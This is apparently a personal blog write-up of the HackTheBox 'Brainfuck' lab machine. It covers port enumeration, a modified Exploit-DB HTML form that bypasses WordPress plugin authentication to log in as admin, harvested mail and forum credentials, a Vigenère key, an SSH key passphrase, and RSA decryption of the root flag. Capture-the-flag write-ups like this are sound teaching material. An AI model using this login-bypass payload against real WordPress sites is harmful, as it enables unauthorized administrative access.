---
layout: post
title:  "HackTheBox - Brainfuck"
date:   2021-08-09 17:06:25
categories: Pentesting
---

# ENUMERATION

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL USER SASL(PLAIN) TOP AUTH-RESP-CODE PIPELINING CAPA RESP-CODES
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: ID more ENABLE listed LOGIN-REFERRALS have AUTH=PLAINA0001 post-login SASL-IR Pre-login capabilities OK IDLE IMAP4rev1 LITERAL+
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-13T11:19:29
| Not valid after:  2027-04-11T11:19:29
| MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
|_SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Getting into https://brainfuck.htb/ I see that there is a user called orestis@brainfuck.htb and that the site is also running wordpress and mysql . After googling a bit we come across this exploit:
[41006](https://www.exploit-db.com/exploits/41006)

And we change the exploit to suit our needs so mine looks like this now:
```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="orestis@brainfuck.htb">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form> 
```
We run this exploit and in another tab we go to https://brainfuck.htb/wp-admin/admin-ajax.php and we see that we have been logged in as admin.

# FOOTHOLD

On checking we see in plugins that there is a plugin for SMTP . On doing inspect element we find the password for orestis in plaintext. Now we try logging in to port 110 using the credentials:
[pentesting pop3](https://book.hacktricks.xyz/pentesting/pentesting-pop)

From here we can get the credentials for orestis and login to sup3rs3cr3t.brainfuck.htb:
```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO
```
There we see some encrypted text in keys which seems to be Vignere Cipher. Trying to decode it we find that the key is "fuckmybrain".
Next we decode the conversation and go to the link provided and download the id_rsa.The id_rsa seems to be encrypted and we can try to ssh into user orestis now.

```
Password for id_rsa: 3poulakia!
```
Now we see the user.txt

# PRIVILEGE ESCALATION

In the directory of the user we see a sage file which seems like RSA:
```s
orestis@brainfuck:~$ cat encrypt.sage
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

It was basic RSA so we decrypted it without any sweat (they even provided the primes)
```py
Type "help", "copyright", "credits" or "license" for more information.
>>> p=7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
>>> q=7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
>>> e=30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
>>> n=p*q
>>> tot=(p-1)*(q-1)
>>> d=pow(e,-1,tot)
>>> c=44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
>>> m=pow(c,d,n)
>>> bytes.fromhex(hex(m)[2:])
b'6efc1a5dbb8904751ce6566a305bb8ef'
```
And this was the flag. We didn't get to actually become root -_-

